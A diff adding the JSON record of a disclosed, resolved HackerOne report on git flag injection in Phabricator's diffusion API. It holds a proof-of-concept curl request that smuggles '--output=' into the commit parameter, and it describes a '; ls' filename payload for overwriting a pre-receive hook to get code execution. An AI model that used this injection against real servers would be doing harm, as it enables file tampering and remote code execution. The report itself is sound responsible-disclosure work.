@@ -1,0 +1,131 @@
+{
+  "id": 1070247,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDcwMjQ3",
+  "url": "https://hackerone.com/reports/1070247",
+  "title": "Git flag injection leads to arbitrary file write",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-01-02T16:03:35.395Z",
+  "submitted_at": "2021-01-02T16:03:35.444Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "crownpeanut",
+    "url": "/crownpeanut",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 18,
+    "url": "https://hackerone.com/phabricator",
+    "handle": "phabricator",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Phabricator",
+      "twitter_handle": "phabricator",
+      "website": "http://phacility.com/phabricator/",
+      "about": "Phabricator is a collection of open source web applications that help software companies build better software."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-07-25T15:13:13.761Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-06-25T15:13:12.989Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "keyword : mongoose\n\n#PoC\n1.  Login and generate API token\n2. Create a repo and push several commits to phabricator\n3. Execute diffusion api\n```\ncurl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \\\n    -d api.token=api-token \\\n    -d commit=--output%3D/tmp/qqq \\\n    -d repository=R2\n```\n\n4. `qqq` file will be created in `tmp` directory. And the content of  `qqq` contains the output of git log.\n\n#Description\n`git log` command is used to show git history in phabricator. \nAPI such as diffusion.internal.gitrawdiffquery and [several others](https://sourcegraph.com/search?q=repo:%5Egithub%5C.com/phacility/phabricator%24+%22%27log+%22+-file:test+count:1000&patternType=regexp&case=yes) use git log command to retrieve commit details.\nBecause lack of validation of `commit` parameter, [this line](https://github.com/phacility/phabricator/blob/b2ab18f8f3d0cbab55b92da7a5fcbc0e148a4c99/src/applications/diffusion/conduit/DiffusionInternalGitRawDiffQueryConduitAPIMethod.php#L99:20) will create command below when PoC is executed\n\n```\ngit log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'\n```\n\nThe content of `qqq` after api is executed.\n```\n$ cat /tmp/qqq\n:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c\n```\n\nNotice that `/tmp/qqqq` is controllable path. By specifying the right path it is possible to do arbitrary write.\n\nIf `/var/repo` is owned by `www-data`, attacker could rewrite `pre-receive` hook by commit filename `; ls` which the payload would be like file below.\n\n```\n$ cat /tmp/qqq\n:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      ; ls\n```\n\nThis could be result in RCE when the next time `pre-receive` hook is called.\n\n## Impact\n\nArbitrary file write in phabricator server. Depends on server configuration, it could result in RCE.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2021-07-25T15:13:13.143Z",
+  "allow_singular_disclosure_after": -151113652.84340394,
+  "singular_disclosure_allowed": true,
+  "vote_count": 54,
+  "voters": [
+    "xploiterr",
+    "osman1337",
+    "poneglyph",
+    "drak3hft7",
+    "run_win",
+    "s1ber",
+    "akashhamal0x01",
+    "musab_alharany",
+    "hetroublehacker",
+    "mirazdevox",
+    "and 44 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
